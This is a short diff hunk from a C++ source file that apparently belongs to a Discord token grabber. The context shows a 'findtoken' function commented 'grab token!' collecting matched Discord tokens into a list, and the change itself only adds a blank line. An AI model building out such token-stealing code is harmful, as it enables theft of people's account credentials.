@@ -64,3 +64,4 @@ void grabbertoken::findtoken(std::string path) // grab token! // thanks based#00
         discordtokens.emplace_back(result.str());
     }
 }
+
